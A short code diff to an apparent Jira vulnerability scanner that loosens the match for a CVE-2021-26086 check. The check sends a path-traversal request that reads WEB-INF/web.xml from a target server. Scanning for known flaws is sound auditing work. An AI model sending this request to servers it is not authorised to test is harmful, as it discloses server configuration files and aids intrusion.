@@ -88,7 +88,7 @@ class ActiveJira:
     def cve_2021_26086(self, target):
         poc = target + '/s/leet/_/;/WEB-INF/web.xml'
         response = requests.get(poc)
-        if b'<web-app>' in response.content and response.status_code == 200:
+        if b'<web-app' in response.content and response.status_code == 200:
             print("CVE-2021-26086" + Fore.YELLOW + "\t\t" + "MEDIUM" + Style.RESET_ALL + "\t\t" + f"{poc}")
     
     def cve_2020_36289(self, target, user):
